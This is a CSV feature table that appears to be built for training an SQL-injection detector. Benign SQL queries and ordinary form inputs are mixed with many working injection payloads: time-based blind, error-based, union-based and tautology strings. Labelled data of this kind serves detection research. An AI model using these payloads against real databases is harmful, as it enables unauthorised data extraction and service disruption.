,Query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords,log_query_len,box_query_len
3710,"1""  )   as tnux where 4888  =  4888 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",0,1,13,0,0,24,0,0,1,0,0,41,10,0,2,4.74493212836325,6.862288715935788
18365,asisia,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
23661," select * from hollow order by room, does",0,0,2,0,0,8,0,0,1,0,0,31,0,0,2,3.713572066704308,4.939896154656966
5807,1 where 8578  =  8578 and 4770  =  4474--,0,0,4,1,0,8,0,1,2,0,0,8,17,0,0,3.713572066704308,4.939896154656966
27310,delete from stared where system = 'whole',2,0,3,0,0,6,0,0,0,0,0,32,0,0,0,3.713572066704308,4.939896154656966
11102,"1'  )   as ljpy where 8270  =  8270 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,0,34,1,0,51,0,1,4,0,0,107,43,1,4,5.659482215759621,8.828673701753054
10803,"1'  )   and make_set  (  8403  =  8403,8899  )  ",1,0,7,0,0,9,0,1,0,0,0,10,13,0,0,3.871201010907891,5.215173163969822
25305,select tool ( s )  from list select exact ( s ) ,0,0,4,0,0,12,0,0,0,0,0,31,0,0,2,3.871201010907891,5.215173163969822
14965,levi@coivoco.gr,0,0,2,0,0,0,0,0,0,0,0,13,0,0,0,2.70805020110221,3.326353218260614
26625,select camera ( s )  from test,0,0,2,0,0,6,0,0,0,0,0,21,0,0,1,3.4011973816621555,4.412867051146341
10121, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  '%'  =  ',3,0,17,0,0,22,1,1,1,0,0,28,1,0,2,4.624972813284271,6.623425332724987
16363,tait,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0,1.3862943611198906,1.5376610839645055
4058,"1%""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""%""  =  """,0,4,17,0,0,18,2,2,0,0,1,18,21,0,0,4.663439094112067,6.699561199523336
777," select * from users where id  =  1 union select 1<@.,version  (    )   -- 1",0,0,10,1,0,15,0,0,3,0,0,40,3,0,2,4.330733340286331,6.055066595411042
3418,"select * from generate_series  (  2317,2317,case when   (  2317  =  9706  )   then 1 else 0 end  )   limit 1--",0,0,11,1,0,19,0,0,3,0,0,48,19,0,1,4.700480365792417,6.77328459478072
28186,select * from dance order by dark,0,0,1,0,0,6,0,0,1,0,0,26,0,0,2,3.49650756146648,4.571113592379885
14626,monforte del cid,0,0,0,0,0,2,0,0,0,0,0,14,0,0,0,2.772588722239781,3.4229084603450888
28894,select top 3 * from replied where fill = 'ordinary',2,0,4,0,0,9,0,0,1,0,0,37,1,0,2,3.9318256327243257,5.322755734775789
18084,maren-bufford4@fruteriacartaya.yu,0,0,3,0,0,0,0,0,1,0,0,29,1,0,0,3.49650756146648,4.571113592379885
4867,"1' in boolean mode  )   union all select null,null,null,null,null,null#",1,0,8,0,0,8,0,0,0,6,0,51,1,6,1,4.262679877041316,5.927077040928176
16249,mary-ell,0,0,1,0,0,0,0,0,1,0,0,7,0,0,0,2.079441541679836,2.432300417938136
20946,select * from flame where book  between 10 and 20,0,0,1,0,0,9,0,1,1,0,0,34,4,0,1,3.8918202981106265,5.251655965920898
15343,15107,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
17534,32727347a,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
17368,reinhard,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
24779,select avg ( wear ) from unless select sum ( carry ) ,0,0,4,0,0,12,0,0,0,0,0,37,0,0,4,3.970291913552122,5.391515666300752
25786,"  select bagid as id, rush as young from material",0,0,1,0,0,9,0,0,0,0,0,38,0,0,1,3.8918202981106265,5.251655965920898
29356,select * from additional where thou = 'not',2,0,4,0,0,7,0,0,1,0,0,32,0,0,1,3.7612001156935615,5.022400427811018
25812,select count ( distinct composed )  from becoming,0,0,2,0,0,7,0,0,0,0,0,39,0,0,2,3.8918202981106265,5.251655965920898
11620,8.96e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
15445,"calle gola de perellonet, 196,",0,0,2,0,0,4,0,0,0,0,0,21,3,0,0,3.4011973816621555,4.412867051146341
18648,6246,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
21812,select min ( of )  as religious from hat,0,0,2,0,0,8,0,0,0,0,0,29,0,0,1,3.688879454113936,4.897348914472564
25787,"  select primitiveid as id, sign as respect from happy",0,0,1,0,0,9,0,0,0,0,0,43,0,0,1,3.9889840465642745,5.42506920217274
3337,"1""   )    )    as ihfw where 3949  =  3949 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",0,1,27,1,0,32,0,4,2,0,0,48,23,4,0,5.087596335232384,7.56826919695837
27653,select * from catch where instrument between '1996-07-01' and '1996-07-31',4,0,9,0,0,9,0,1,5,0,0,40,16,0,1,4.30406509320417,6.004758445183105
2900,"-1305  )   or make_set  (  2298  =  5545,5545  )   and   (  6715  =  6715",0,0,9,0,0,13,0,2,1,0,0,12,24,0,0,4.290459441148391,5.97916802637938
22465,select year from sand,0,0,0,0,0,3,0,0,0,0,0,18,0,0,1,3.044522437723423,3.839958531231341
26270,select * from setting where hearing between angry09/01/1996pay and such15/31/1996cold,0,0,5,0,0,9,0,1,5,0,0,55,16,0,1,4.442651256490317,6.268357393526619
10503,select   (  case when   (  2914  =  3335  )   then 2914 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,0,0,12,1,0,28,0,0,3,0,0,56,14,0,2,4.890349128221754,7.157548893414895
21887,select * from species order by love,0,0,1,0,0,6,0,0,1,0,0,28,0,0,2,3.555348061489413,4.669921102482963
13303,38449362d,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
28616,select avg ( say ) from shirt select sum ( desert ) ,0,0,4,0,0,12,0,0,0,0,0,36,0,0,4,3.951243718581428,5.357417698153898
11427,katia,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
22546,select railroad ( s )  from bar left join,0,0,2,0,0,8,0,0,0,0,0,30,0,0,2,3.713572066704308,4.939896154656966
29109,select avg ( policeman )  from memory  select sum ( clothes ) ,0,0,4,0,0,12,0,0,0,0,0,44,0,0,4,4.127134385045092,5.675937336868984
18813,newlinsky@forohh.et,0,0,2,0,0,0,0,0,0,0,0,17,0,0,0,2.9444389791664403,3.684523708911846
18880,96110955g,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
27797,"insert into rays  ( fog, rising, tall )  values  ( 'rule', 'grabbed', 'been' )  ",6,0,14,0,0,14,0,0,0,0,0,48,0,0,0,4.382026634673881,6.152384767567401
18809,0i26or7os9,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,2.302585092994046,2.7402564225600523
20212,"   select softly, sets, helpfrom stepped where jack  is not null",0,0,2,0,0,10,0,1,0,1,0,49,0,1,1,4.158883083359672,5.734313559436426
28864,select * from exactly,0,0,1,0,0,3,0,0,1,0,0,17,0,0,1,3.044522437723423,3.839958531231341
21337,select * from fix  where noon not like '[cent]%',2,0,6,0,0,8,1,1,1,0,0,33,0,0,1,3.871201010907891,5.215173163969822
29177, update exercise set arm = 'location'where stove = 'organized',4,0,6,0,0,9,0,0,0,0,0,47,0,0,0,4.127134385045092,5.675937336868984
20552,select * from corn where bite between 'at' and 'share',4,0,5,0,0,9,0,1,1,0,0,40,0,0,1,3.9889840465642745,5.42506920217274
17540,"travesia brieva, 171,",0,0,2,0,0,2,0,0,0,0,0,14,3,0,0,3.044522437723423,3.839958531231341
7028,select case when 6662  =  9889 then 1 else null end--,0,0,3,1,0,10,0,0,2,1,0,29,9,1,1,3.970291913552122,5.391515666300752
28870,select * from excellent where pressure = 'sides'  or section = 'cutting',4,0,7,0,0,11,0,1,1,0,0,53,0,0,1,4.276666119016055,5.953276820822519
24131,"  select log,front from night where thirty = 'unhappy' union select oldest, particles from stepped",2,0,5,0,0,14,0,0,0,0,0,78,0,0,2,4.584967478670572,6.544698632292425
12510,20491,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
2381,1  )   as jqbp where 5407  =  5407 and 4595  =  4595#,0,0,4,0,0,11,0,1,0,0,0,14,17,0,0,3.970291913552122,5.391515666300752
28638,select * from all where paint between '1996-07-01' and '1996-07-31',4,0,9,0,0,9,0,1,5,0,0,33,16,0,1,4.204692619390966,5.819025031871101
14652,cruz,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0,1.3862943611198906,1.5376610839645055
10731,"1'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'lwyo'  =  'lwyo",4,0,19,0,0,23,0,2,1,0,0,43,13,0,2,4.912654885736052,7.2034003052594375
29665,"  update road set separate =  'particular', city =  'freedom' where chapter =  favorite",4,0,8,0,0,13,0,0,0,0,0,62,0,0,0,4.465908118654584,6.313121924766899
13366,scorziel,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
24756,select lady ( s )  from swung,0,0,2,0,0,6,0,0,0,0,0,20,0,0,1,3.367295829986474,4.357111686472804
23807,select * from bear where magic between 'fort' and 'typical',4,0,5,0,0,9,0,1,1,0,0,45,0,0,1,4.07753744390572,5.5852871348767055
9784,1   )    )    as beld where 1679  =  1679 or sleep  (  5  )  #,0,0,6,0,0,14,0,1,0,0,0,18,10,0,0,4.127134385045092,5.675937336868984
4258,"-7381'   )    )    or elt  (  5882  =  5919,5919  )   and    (    (   'nzri'  =  'nzri",4,0,14,0,0,15,0,2,1,0,0,16,16,0,0,4.454347296253507,6.2908506611672514
19705,select * into newtable [in externaldb ] from oldtable where condition ;,0,0,4,0,0,11,0,0,1,0,0,56,0,0,1,4.262679877041316,5.927077040928176
12717,r3i8a83nt1,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,2.302585092994046,2.7402564225600523
16154,1467,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
18146,rillo de gallo,0,0,0,0,0,2,0,0,0,0,0,12,0,0,0,2.6390573296152584,3.2241419783899143
14683,wong@hiperespaa.ly,0,0,2,0,0,0,0,0,0,0,0,16,0,0,0,2.8903717578961645,3.6015010896570807
13054,tenuta,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
28922,select * from lower where football  between 10 and 20,0,0,1,0,0,9,0,1,1,0,0,38,4,0,1,3.970291913552122,5.391515666300752
7514,"1'   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'ngwt'  =  'ngwt",4,0,48,0,0,54,0,7,0,2,0,83,27,9,0,5.627621113690637,8.75563168370812
6626,-3161'  )   or 8501  =  1796,1,0,4,0,0,5,0,1,1,0,0,2,12,0,0,3.332204510175204,4.299691526222142
2157,"1%"" and elt  (  3114  =  3114,sleep  (  5   )    )   #",0,1,9,0,0,11,1,1,0,0,0,11,10,0,0,3.9889840465642745,5.42506920217274
27020,select top 3 * from flies,0,0,1,0,0,5,0,0,1,0,0,18,1,0,2,3.218875824868201,4.116261188933881
26406,select * from wait where moon = 'clearly',2,0,4,0,0,7,0,0,1,0,0,30,0,0,1,3.713572066704308,4.939896154656966
3568,"-3852'  )   union all select 3577,3577,3577,3577,3577,3577,3577,3577#",1,0,11,0,0,5,0,0,1,0,0,14,36,0,1,4.23410650459726,5.873719016140452
6144,"1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'sied'  =  'sied",4,0,20,0,0,26,0,2,1,0,0,83,8,0,2,5.123963979403259,7.645305127152001
23052,"   select employees.shown, count ( orders.massageid )  as soapfrom    ( ordersinner join work on orders.biggerid  =  employees.tieid ) ",0,0,10,0,0,18,0,0,0,0,0,99,0,0,3,4.90527477843843,7.188213210536463
19092,"entrada tamarit, 32,",0,0,2,0,0,2,0,0,0,0,0,14,2,0,0,2.995732273553991,3.7638991627446954
20778,"  select announced,noon from beginning where brown = 'cave' union select foot, quiet from rabbit",2,0,5,0,0,14,0,0,0,0,0,76,0,0,2,4.564348191467836,6.504302289710709
8962,"1""  )   as piwi where 2918  =  2918",0,1,3,0,0,7,0,0,0,0,0,11,9,0,0,3.555348061489413,4.669921102482963
22976,"insert into wool ( vapor, frog, ranch, nodded, war, angry )  values  ( 'mother', 'yourself'. thy', 'call', 'depend', 'thou', 'particles' )  ",13,0,28,0,0,21,0,0,0,0,0,88,0,0,0,4.941642422609304,7.263211790926113
13729,bora,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0,1.3862943611198906,1.5376610839645055
8972,"-8677'||  (  select 'ihpm' from dual where 9571  =  9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",3,0,19,1,0,13,0,1,3,0,0,37,52,0,2,4.8283137373023015,7.030817503794459
905,"1'||  (  select 'rttq' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",4,0,28,0,0,32,0,3,0,0,1,56,47,0,2,5.293304824724492,8.009486135188531
13714,nelba,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
24209,select avg ( price ) from day,0,0,2,0,0,6,0,0,0,0,0,21,0,0,2,3.367295829986474,4.357111686472804
23137,select manufacturing ( s )  from nearest left join,0,0,2,0,0,8,0,0,0,0,0,39,0,0,2,3.912023005428146,5.287509109454676
23642,select phrase,0,0,0,0,0,1,0,0,0,0,0,12,0,0,1,2.5649493574615367,3.1155015354702966
4180,"1   )    )    as juoe where 9994  =  9994 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",0,0,18,1,0,29,0,1,3,0,0,82,17,0,2,5.123963979403259,7.645305127152001
26921,select top 3 * from activity,0,0,1,0,0,5,0,0,1,0,0,21,1,0,2,3.332204510175204,4.299691526222142
16593,schwuchow9@viajessolomujeres.bj,0,0,2,0,0,0,0,0,0,0,0,28,1,0,0,3.4339872044851463,4.467059038127735
9894,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'yvbb'  =  'yvbb",3,0,13,0,0,17,0,1,1,0,0,73,3,0,2,4.7535901911063645,6.879692212398552
27259,select avg ( price ) from his,0,0,2,0,0,6,0,0,0,0,0,21,0,0,2,3.367295829986474,4.357111686472804
1718,"-3169"" order by 1#",0,1,3,0,0,3,0,0,1,0,0,7,5,0,1,2.8903717578961645,3.6015010896570807
15373,pizani@unanuevavisionenortodoncia.tg,0,0,2,0,0,0,0,0,0,0,0,34,0,0,0,3.58351893845611,4.717530264472627
26632,select top 3 * from steep where off = 'captain',2,0,4,0,0,9,0,0,1,0,0,33,1,0,2,3.8501476017100575,5.178036175455065
2552,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   3127  =  3127",0,0,27,0,0,34,0,3,0,2,0,60,24,5,0,5.214935757608986,7.839819880346576
11356,lu,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0.6931471805599453,0.7296931454567191
26590,select roll from exclaimed union all select rabbit from struggle order by office,0,0,0,0,0,12,0,0,0,0,0,68,0,0,3,4.382026634673881,6.152384767567401
24543,select * from flame where progress = 'push'  and  ( turn = 'perfect' or bound = 'seven' ) ,6,0,12,0,0,18,0,2,1,0,0,58,0,0,1,4.499809670330265,6.378649993862576
2706,1'  )   where 5378  =  5378,1,0,3,0,0,5,0,0,0,0,0,5,9,0,0,3.295836866004329,4.240494654101009
17618,"altos de lillo, 137",0,0,1,0,0,3,0,0,0,0,0,12,3,0,0,2.9444389791664403,3.684523708911846
4316,"1'||  (  select 'ltqo' where 9080  =  9080 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",6,0,24,0,0,25,0,3,1,0,0,47,23,0,1,5.017279836814924,7.4204839101504465
16391,8.70e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
26347,select top 3 * from lift where sound = 'shoulder' select * from fur,2,0,5,0,0,13,0,0,2,0,0,48,1,0,3,4.204692619390966,5.819025031871101
8965,1  )   where 4653  =  4653 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,0,0,10,1,0,18,0,1,2,0,0,24,18,0,1,4.48863636973214,6.357017110069445
27737,select * from tip  where onto not like '[table]%',2,0,6,0,0,8,1,1,1,0,0,34,0,0,1,3.8918202981106265,5.251655965920898
13919,antirreglamentaria,0,0,0,0,0,0,0,0,0,0,0,18,0,0,0,2.8903717578961645,3.6015010896570807
2694,"1"" where 8697  =  8697 and elt  (  3114  =  3114,sleep  (  5   )    )   #",0,1,9,0,0,15,0,1,0,0,0,16,18,0,0,4.290459441148391,5.97916802637938
14578,montell i martinet,0,0,0,0,0,2,0,0,0,0,0,16,0,0,0,2.8903717578961645,3.6015010896570807
11072,"-8007' where 9649  =  9649 union all select 9649,9649,9649,9649,9649,9649,9649,9649,9649--",1,0,13,1,0,8,0,0,3,0,0,19,48,0,1,4.499809670330265,6.378649993862576
3003,"1  )   where 1013  =  1013 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",0,0,51,1,0,80,0,1,12,0,0,97,55,12,2,5.918893854273146,9.436284488043231
403,a' or 3  =  3--,1,0,4,1,0,4,0,1,2,0,0,3,2,0,0,2.70805020110221,3.326353218260614
14456,1.21e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
16520,pankiw,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
17051,"c/ nueva fuera, 139 3?g",0,0,3,0,0,4,0,0,1,0,0,12,4,0,0,3.1354942159291497,3.983240309714999
28201,select top 3 * from unknown,0,0,1,0,0,5,0,0,1,0,0,20,1,0,2,3.295836866004329,4.240494654101009
18739,acho queralt,0,0,0,0,0,1,0,0,0,0,0,11,0,0,0,2.4849066497880004,2.999482870035824
19441,"select wp_posts.id from wp_posts where 1 = 1 and wp_posts.post_type  =  'acf-field' and   (  (  wp_posts.post_status  =  'publish'  )  )   and wp_posts.post_name  =  'field_5f6c881b67715' order by wp_posts.menu_order asc, wp_posts.post_title asc limit 0, 1",6,0,36,0,0,32,0,3,1,0,0,160,14,0,2,5.545177444479562,8.568208781379385
27770,select church from field union all select model from watch order by joy,0,0,0,0,0,12,0,0,0,0,0,59,0,0,3,4.262679877041316,5.927077040928176
8566,"1%' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and '%'  =  '",4,0,28,0,0,34,2,2,1,0,1,47,32,0,3,5.225746673713202,7.863109066817221
1241,"1   )    )    as ambt where 5198  =  5198 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",0,0,32,1,0,43,0,4,2,1,0,64,35,6,0,5.389071729816501,8.21948951003576
11873,mclawhor,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
10615,1   )    ) ,0,0,2,0,0,3,0,0,0,0,0,0,1,0,0,2.3978952727983707,2.8749024412290907
23602,select * from leader where aid not like 'offer%',2,0,4,0,0,8,1,1,1,0,0,36,0,0,1,3.871201010907891,5.215173163969822
4092,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin",4,0,11,0,0,14,0,2,0,0,1,26,22,0,0,4.48863636973214,6.357017110069445
22864,select * from library where community = 'exact',2,0,4,0,0,7,0,0,1,0,0,36,0,0,1,3.8501476017100575,5.178036175455065
19246,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 715 )  order by meta_id asc",0,0,10,0,0,15,0,0,0,0,0,71,3,0,2,4.61512051684126,6.603993955492575
23849,select * from function  where object = end,0,0,2,0,0,7,0,0,1,0,0,32,0,0,1,3.737669618283368,4.981567234930947
4297,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",0,1,9,0,0,4,1,0,1,0,0,14,28,0,1,4.007333185232471,5.458096843121287
8471,"-9166""  )   as hlre where 4768  =  4768 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",4,1,20,1,0,29,0,3,3,0,0,63,26,0,1,5.0369526024136295,7.461676673594362
20870," select column_name ( s )  from silver,pot",0,0,4,0,0,7,0,0,0,0,0,30,0,0,1,3.737669618283368,4.981567234930947
20058,"select weekday ( ""2017-01-01"" ) ;",0,2,7,0,0,5,0,0,2,0,0,13,8,0,1,3.49650756146648,4.571113592379885
8657,"-1483' or make_set  (  9354  =  9354,7185  )   and 'qfil'  =  'qfil",4,0,11,0,0,11,0,2,1,0,0,20,16,0,0,4.204692619390966,5.819025031871101
29125,select * from sale where shirt between '1996-07-01' and '1996-07-31',4,0,9,0,0,9,0,1,5,0,0,34,16,0,1,4.219507705176107,5.846543550882007
8711,"1%""  )   union all select null,null,null--",0,1,7,1,0,5,1,0,2,3,0,26,1,3,1,3.737669618283368,4.981567234930947
2365,1  )   where 2734  =  2734 waitfor delay '0:0:5'--,2,0,8,1,0,8,0,0,2,0,0,17,12,0,0,3.912023005428146,5.287509109454676
20735,select * from giant where string not like '[person]%',2,0,6,0,0,8,1,1,1,0,0,39,0,0,1,3.970291913552122,5.391515666300752
405," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",0,0,8,1,0,20,0,0,4,0,0,62,5,0,2,4.59511985013459,6.564633716663423
19161,â or 1  =  1 --,0,0,3,1,0,5,0,1,2,0,0,2,2,0,0,2.833213344056216,3.514446415767603
13689,madan deluca,0,0,0,0,0,1,0,0,0,0,0,11,0,0,0,2.4849066497880004,2.999482870035824
21898,delete from would where officer = 'lying',2,0,3,0,0,6,0,0,0,0,0,32,0,0,0,3.713572066704308,4.939896154656966
11795,5arneci052,0,0,0,0,0,0,0,0,0,0,0,6,4,0,0,2.302585092994046,2.7402564225600523
7822,"1  )   as zelk where 1944  =  1944 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,0,43,1,0,54,0,6,2,2,0,82,37,9,0,5.5909869805108565,8.6720691722173
22266,select * from capital,0,0,1,0,0,3,0,0,1,0,0,17,0,0,1,3.044522437723423,3.839958531231341
29063,select * from should where rear = 'divide',2,0,4,0,0,7,0,0,1,0,0,31,0,0,1,3.737669618283368,4.981567234930947
4620,"-4798%'   )    )     )   union all select 3330,3330,3330#",1,0,9,0,0,7,1,0,1,0,0,14,16,0,1,4.04305126783455,5.522643883333643
